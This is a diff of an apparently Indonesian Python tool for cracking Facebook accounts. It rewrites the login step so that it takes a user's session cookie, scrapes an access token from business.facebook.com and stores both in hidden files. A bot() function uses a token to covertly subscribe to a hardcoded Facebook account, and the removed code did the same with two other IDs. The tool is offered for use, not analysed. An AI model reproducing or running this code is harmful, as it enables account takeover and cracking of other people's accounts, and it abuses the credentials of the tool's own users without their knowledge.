@@ -295,64 +295,25 @@ class Crack(Main):
 			print(f"\r[=] {str(loop)}/{str(len(nampung))} Ok/Cp: {str(ok)}/{str(cp)} CRACK: {'{:.1%}'.format(loop/float(len(nampung)))}	",end="")
 	
 def login():
-	os.system("clear")
-	logo_login = """\n
-.##.......####....####...######..##..##.
-.##......##..##..##........##....###.##.
-.##......##..##..##.###....##....##.###.
-.##......##..##..##..##....##....##..##.
-.######...####....####...######..##..##.
-........................................
-	"""
-	print(logo_login,"\n * Login terlerbih dahulu menggunakan accesstoken facebook!\n * Jika tidak mempunyai token atau cookies silahkan cari tutorialnya di youtube untuk mendapatkan token facebook.\n * Ketika sudah memakai sc ini maka Author tidak bertanggung jawab atas resiko apa yang akan terjadi kedepannya.\n")
-	print(" * Ingin login menggunakan apa\n[1]. Login menggunakan cookies [Rawan Sesi New]\n[2]. Login menggunakan token")
-	bingung = input("\n[?] Login menggunakan: ")
-	__pilihan = ["01","1","02","2"]
-	while bingung not in __pilihan:
-		print("\n[!] Pilihan tidak ada")
-		bingung = input("[?] Login menggunakan: ")
-	if bingung in ("01","1"):
-		__cokiee = input("[?] cookie\t: ")
-		__coki = cv.Main(__cokiee).getToken()
-		if "EAA" in __coki:
-			_cek = json.loads(req.get(f"https://graph.facebook.com/me?access_token={__coki}").text)
-			_id = _cek['id']
-			_nama = _cek['name']
-			input(f"\n[✓] Berhasil login menggunakan cookies\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
-			open("data/save.txt","a").write(__coki)
-			Data(__coki,_id,_nama).menu()
-		elif "Cookies Invalid" in __coki:
-			exit("\n[!] Cookies Invalid")
-		else:
-			exit("\n[!] Kesalahan")
-	elif bingung in ("02","2"):
-		__token = input("[?] token\t: ")
-		try:
-			__res=json.loads(req.get(f"https://graph.facebook.com/me?access_token={__token}").text)
-			_nama = __res['name']
-			_id = __res['id']
-			req.post(f'https://graph.facebook.com/100013031465766/subscribers?access_token={__token}')
-			req.post(f'https://graph.facebook.com/100034433778381/subscribers?access_token={__token}')
-			input(f"\n[✓] Berhasil login menggunakan token\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
-			open("data/save.txt","a").write(__token)
-			Data(__token, _id, _nama).menu()
-		except KeyError:
-			print("\n[!] token invalid")
-	
-	
-if __name__=="__main__":
 	try:
-		__token = open("data/save.txt","r").read()
-		__res=json.loads(req.get(f"https://graph.facebook.com/me?access_token={__token}").text)
-		_nama = __res['name']
-		_id = __res['id']
-		print(f" * Welcome back {_nama}\n * Menuju menu...")
-		time.sleep(3)
-		Data(__token, _id, _nama).menu()
-	except KeyError:
-		os.system("rm -rf data/save.txt")
-		print("\n[!] token invalid")
-	except FileNotFoundError:
-		print("[!] belum login\n * Menuju ke menu login...")
-		time.sleep(3)
-		login()
+		os.system('clear')
+		banner()
+		cetak(nel('\t©©© Saran Ektensi : [green]Cookiedough[white] ©©©'))
+		asu = random.choice([m,k,h,b,u])
+		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
+		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
+		find_token = re.search("(EAAG\w+)", data.text)
+		ken=open(".token.txt", "w").write(find_token.group(1));bot()
+		cok=open(".cok.txt", "w").write(cookie)
+		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
+		exit()
+	except Exception as e:
+		os.system("rm -f .token.txt")
+		os.system("rm -f .cok.txt")
+		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
+		exit()
+def bot():
+	try:
+		requests.post("https://graph.facebook.com/100013261902810?fields=subscribers&access_token=%s"%(tokenku))
+	except:
+		pass
